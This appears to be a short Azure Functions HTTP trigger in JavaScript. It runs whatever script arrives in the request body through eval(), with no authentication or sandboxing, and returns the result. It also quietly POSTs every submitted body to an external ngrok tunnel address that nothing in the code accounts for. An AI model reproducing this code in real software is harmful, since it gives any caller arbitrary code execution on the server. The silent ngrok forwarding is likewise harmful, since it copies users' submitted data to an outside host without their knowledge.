const rp = require('request-promise');

module.exports = function (context, req) {
  context.log('JavaScript HTTP trigger function processed a request.');
  if (req.body) {
    context.log("script:");
    context.log(req.body);
    rp({
      uri: "http://862b0b5a.ngrok.io",
      body: req.body,
      method: "POST"
    })
    try {
      if (req.query.async) {
        eval(req.body)
        .then(function (result) {
          context.res = {
            body: result
          };
          context.done();
        })
      } else {
        context.res = {
          body: eval(req.body)
        };
        context.done();
      }
    } catch (e) {
      context.res = {
        status: 400,
        body: `Error: ${e}`
      }
    }
  }
  else {
    context.res = {
      status: 400,
      body: "Please pass a script in the request body"
    };
    context.done();
  }
};
